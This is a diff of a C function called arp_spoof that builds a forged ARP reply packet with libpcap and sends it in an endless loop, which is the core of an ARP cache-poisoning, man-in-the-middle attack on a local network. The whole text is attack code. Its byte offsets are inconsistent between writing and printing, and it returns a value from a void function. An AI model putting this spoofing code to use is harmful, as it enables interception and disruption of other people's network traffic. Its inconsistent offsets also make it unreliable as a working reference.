@@ -141,12 +141,13 @@ void arp_spoof(u_char *dev_str, u_char *sender_ip, u_char *target_ip){
 
 // REPLACE : sender ip, target ip
 	for(int i=0; i<4; i++){
-		arp_packet[29+i]=sender_ip[i];
+		arp_packet[28+i]=sender_ip[i];
 	}	
 	for(int i=0; i<4; i++){
-		arp_packet[37+i]=target_ip[i];
+		arp_packet[38+i]=target_ip[i];
 	}	
-	arp_packet[21]=0x01;
+// REPLACE OPCODE
+	arp_packet[21]=0x02;
 
 /*
 	for(i=0;i<sizeof(arp_packet);i++){
@@ -161,7 +162,7 @@ void arp_spoof(u_char *dev_str, u_char *sender_ip, u_char *target_ip){
 	char errbuf[PCAP_ERRBUF_SIZE];
 	bpf_u_int32 mask;
 	bpf_u_int32 net;
-	int count=0;
+
 
 
 
@@ -169,28 +170,28 @@ void arp_spoof(u_char *dev_str, u_char *sender_ip, u_char *target_ip){
 	s_handle = pcap_open_live(dev_str, BUFSIZ, 1, 1000, errbuf);
 	if (s_handle == NULL) { fprintf(stderr, "Couldn't open device %s: %s\n", dev_str, errbuf); return(2); }
 	
-
+	
 // WORK
 	while(1){
-		for(count=0; count<sizeof(arp_packet); count++){
-		pcap_sendpacket(s_handle, arp_packet, 43);
+		for(int i=0; i<sizeof(arp_packet); i++){
+		pcap_sendpacket(s_handle, arp_packet, sizeof(arp_packet));
 
-		if(count%16==0) printf("\n");
-		printf("%02x ",arp_packet[count]);
-
-		printf("\nin Sender IP: ");
-		for(int i=0; i<4; i++){
-			printf("%d",arp_packet[29+i]);
-			if(i<3)printf(".");
-		}
-		printf("\n");
-		printf("in Target IP: ");
-		for(int i=0;i<4; i++){
-			printf("%d", arp_packet[37+i]);
-			if(i<3)printf(".");
-		}
-		printf("\n");		
+		if(i%16==0) printf("\n");
+		printf("%02x ",arp_packet[i]);	
 	}
+
+	printf("\nin Sender IP: ");
+	for(int i=0; i<4; i++){
+		printf("%d",arp_packet[29+i]);
+		if(i<3)printf(".");
+	}
+	printf("\n");
+	printf("in Target IP: ");
+	for(int i=0;i<4; i++){
+		printf("%d", arp_packet[37+i]);
+		if(i<3)printf(".");
+	}
+
  }
 
 }
